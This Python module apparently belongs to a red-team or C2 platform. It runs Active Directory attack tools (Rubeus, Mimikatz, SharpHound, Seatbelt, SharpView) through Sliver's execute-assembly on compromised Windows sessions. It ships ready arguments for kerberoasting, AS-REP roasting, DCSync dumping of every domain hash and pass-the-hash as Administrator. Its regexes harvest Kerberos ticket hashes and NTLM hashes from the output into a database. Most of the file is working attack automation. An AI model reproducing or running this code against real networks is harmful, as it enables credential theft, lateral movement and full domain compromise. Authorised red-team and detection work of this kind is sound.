"""
Active Directory attack executor.

Wraps common AD attack tools (SharpHound, Rubeus, Mimikatz, Seatbelt, SharpView)
and executes them via Sliver's execute-assembly on remote Windows nodes.
"""

import logging
import re
import uuid
from datetime import datetime, timezone
from typing import Optional

import psycopg2

log = logging.getLogger("ad_executor")

# AD attack definitions: attack_type -> (tool, default args, description)
AD_ATTACKS = {
    "bloodhound": {
        "tool": "SharpHound.exe",
        "default_args": "-c All --outputdirectory C:\\Windows\\Temp",
        "description": "BloodHound collection - maps AD relationships",
        "category": "Enumeration",
    },
    "kerberoast": {
        "tool": "Rubeus.exe",
        "default_args": "kerberoast /nowrap",
        "description": "Extract TGS tickets for offline cracking",
        "category": "Credential Attacks",
    },
    "asreproast": {
        "tool": "Rubeus.exe",
        "default_args": "asreproast /nowrap",
        "description": "Find accounts without Kerberos pre-auth",
        "category": "Credential Attacks",
    },
    "dcsync": {
        "tool": "Mimikatz.exe",
        "default_args": '"lsadump::dcsync /all /csv"',
        "description": "Extract password hashes via DC replication",
        "category": "Credential Attacks",
    },
    "seatbelt": {
        "tool": "Seatbelt.exe",
        "default_args": "-group=all -full",
        "description": "Host security audit and situational awareness",
        "category": "Enumeration",
    },
    "pth": {
        "tool": "Mimikatz.exe",
        "default_args": '"sekurlsa::pth /user:Administrator /ntlm:{hash} /domain:{domain}"',
        "description": "Pass-the-hash lateral movement",
        "category": "Lateral Movement",
    },
    "enum_domain": {
        "tool": "SharpView.exe",
        "default_args": "Get-DomainController",
        "description": "Enumerate domain controllers and trust relationships",
        "category": "Enumeration",
    },
}


def get_attack_types() -> list[dict]:
    """Return all available AD attack types with metadata."""
    return [
        {
            "id": k,
            "tool": v["tool"],
            "description": v["description"],
            "category": v["category"],
            "default_args": v["default_args"],
        }
        for k, v in AD_ATTACKS.items()
    ]


class ADExecutor:
    def __init__(self, sliver_client, db_dsn: str):
        self.sliver = sliver_client
        self.db_dsn = db_dsn

    def _get_conn(self):
        return psycopg2.connect(self.db_dsn)

    async def execute_attack(
        self,
        node_id: str,
        session_id: str,
        attack_type: str,
        target_domain: Optional[str] = None,
        custom_args: Optional[str] = None,
    ) -> dict:
        """Execute an AD attack via Sliver execute-assembly."""
        if attack_type not in AD_ATTACKS:
            return {"error": f"Unknown attack type: {attack_type}"}

        attack = AD_ATTACKS[attack_type]
        args = custom_args or attack["default_args"]

        # Substitute domain placeholder if present
        if target_domain and "{domain}" in args:
            args = args.replace("{domain}", target_domain)

        # Create DB record
        result_id = str(uuid.uuid4())
        conn = self._get_conn()
        cur = conn.cursor()
        cur.execute(
            """INSERT INTO ad_attack_results
               (id, node_id, attack_type, status, target_domain, tool, command_used, created_at)
               VALUES (%s, %s, %s, 'running', %s, %s, %s, %s)""",
            (result_id, node_id, attack_type, target_domain, attack["tool"], args, datetime.now(timezone.utc)),
        )
        conn.commit()

        try:
            # Load assembly from known path (operator must stage these)
            assembly_path = f"/app/assemblies/{attack['tool']}"
            try:
                with open(assembly_path, "rb") as f:
                    assembly_bytes = f.read()
            except FileNotFoundError:
                error_msg = f"Assembly not found: {assembly_path}. Stage it in the node-manager container."
                cur.execute(
                    "UPDATE ad_attack_results SET status='failed', error=%s WHERE id=%s",
                    (error_msg, result_id),
                )
                conn.commit()
                cur.close()
                conn.close()
                return {"error": error_msg, "result_id": result_id}

            # Execute via Sliver
            output = await self.sliver.execute_assembly(session_id, assembly_bytes, args)

            if output is None:
                error_msg = "No output returned from execute-assembly"
                cur.execute(
                    "UPDATE ad_attack_results SET status='failed', error=%s WHERE id=%s",
                    (error_msg, result_id),
                )
                conn.commit()
                cur.close()
                conn.close()
                return {"error": error_msg, "result_id": result_id}

            # Parse output for structured data
            parsed = self._parse_output(attack_type, output)

            cur.execute(
                """UPDATE ad_attack_results
                   SET status='completed', output=%s, parsed_results=%s,
                       findings_count=%s, completed_at=%s
                   WHERE id=%s""",
                (
                    output,
                    psycopg2.extras.Json(parsed),
                    parsed.get("count", 0),
                    datetime.now(timezone.utc),
                    result_id,
                ),
            )
            conn.commit()

            return {
                "result_id": result_id,
                "status": "completed",
                "output_length": len(output),
                "parsed": parsed,
            }

        except Exception as e:
            log.error("AD attack failed: %s", e)
            cur.execute(
                "UPDATE ad_attack_results SET status='failed', error=%s WHERE id=%s",
                (str(e), result_id),
            )
            conn.commit()
            return {"error": str(e), "result_id": result_id}
        finally:
            cur.close()
            conn.close()

    def _parse_output(self, attack_type: str, output: str) -> dict:
        """Parse tool output for structured data (hashes, tickets, SIDs, etc.)."""
        parsed: dict = {"raw_lines": len(output.splitlines())}

        if attack_type == "kerberoast":
            # Extract TGS hashes
            hashes = re.findall(r'\$krb5tgs\$[^\s]+', output)
            parsed["hashes"] = hashes
            parsed["count"] = len(hashes)

        elif attack_type == "asreproast":
            hashes = re.findall(r'\$krb5asrep\$[^\s]+', output)
            parsed["hashes"] = hashes
            parsed["count"] = len(hashes)

        elif attack_type == "dcsync":
            # Extract NTLM hashes (user:rid:lm:ntlm)
            entries = re.findall(r'([^\s:]+):\d+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}', output)
            parsed["accounts"] = entries
            parsed["count"] = len(entries)

        elif attack_type == "bloodhound":
            # Look for output file indicators
            zip_files = re.findall(r'(\S+\.zip)', output)
            parsed["output_files"] = zip_files
            parsed["count"] = len(zip_files)

        elif attack_type == "seatbelt":
            # Count sections
            sections = re.findall(r'====== (.+?) ======', output)
            parsed["sections"] = sections
            parsed["count"] = len(sections)

        elif attack_type == "enum_domain":
            # Extract domain controller names
            dcs = re.findall(r'Name\s*:\s*(\S+)', output)
            parsed["domain_controllers"] = dcs
            parsed["count"] = len(dcs)

        else:
            parsed["count"] = 0

        return parsed

    async def get_results(self, node_id: str) -> list[dict]:
        """Get all AD attack results for a node."""
        conn = self._get_conn()
        cur = conn.cursor()
        cur.execute(
            """SELECT id, attack_type, status, target_domain, tool,
                      command_used, findings_count, error,
                      created_at, completed_at
               FROM ad_attack_results
               WHERE node_id = %s
               ORDER BY created_at DESC""",
            (node_id,),
        )
        rows = cur.fetchall()
        cur.close()
        conn.close()
        return [
            {
                "id": str(r[0]),
                "attack_type": r[1],
                "status": r[2],
                "target_domain": r[3],
                "tool": r[4],
                "command_used": r[5],
                "findings_count": r[6],
                "error": r[7],
                "created_at": r[8].isoformat() if r[8] else None,
                "completed_at": r[9].isoformat() if r[9] else None,
            }
            for r in rows
        ]

    async def get_result_detail(self, result_id: str) -> Optional[dict]:
        """Get detailed result for a specific AD attack."""
        conn = self._get_conn()
        cur = conn.cursor()
        cur.execute(
            """SELECT id, node_id, attack_type, status, target_domain, tool,
                      command_used, output, parsed_results, findings_count,
                      error, created_at, completed_at
               FROM ad_attack_results WHERE id = %s""",
            (result_id,),
        )
        r = cur.fetchone()
        cur.close()
        conn.close()
        if not r:
            return None
        return {
            "id": str(r[0]),
            "node_id": str(r[1]),
            "attack_type": r[2],
            "status": r[3],
            "target_domain": r[4],
            "tool": r[5],
            "command_used": r[6],
            "output": r[7],
            "parsed_results": r[8],
            "findings_count": r[9],
            "error": r[10],
            "created_at": r[11].isoformat() if r[11] else None,
            "completed_at": r[12].isoformat() if r[12] else None,
        }
